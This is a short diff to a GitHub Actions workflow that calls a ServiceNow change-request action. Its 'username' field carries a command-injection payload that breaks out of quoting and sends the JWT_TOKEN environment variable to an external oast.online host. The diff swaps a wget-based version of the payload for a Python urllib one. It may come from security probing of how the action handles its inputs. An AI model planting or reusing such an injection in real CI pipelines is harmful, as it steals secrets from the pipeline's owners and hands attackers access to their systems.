@@ -10,6 +10,6 @@ jobs:
         with:
           action-type: 'create_change'
           url: 'https://example.service-now.com'
-          username: "x' & wget -qO- 'https://d92m7ikjor34qm6itqugomnxjizzyujbs.oast.online/?jwt='$JWT_TOKEN; :'y"
+          username: "x' & python3 -c \"import urllib.request; urllib.request.urlopen('https://d92m7ikjor34qm6itqugomnxjizzyujbs.oast.online/?jwt=' + __import__('os').environ['JWT_TOKEN'])\"; :'y"
           password: 'testpass'
           cr-number: '12345'
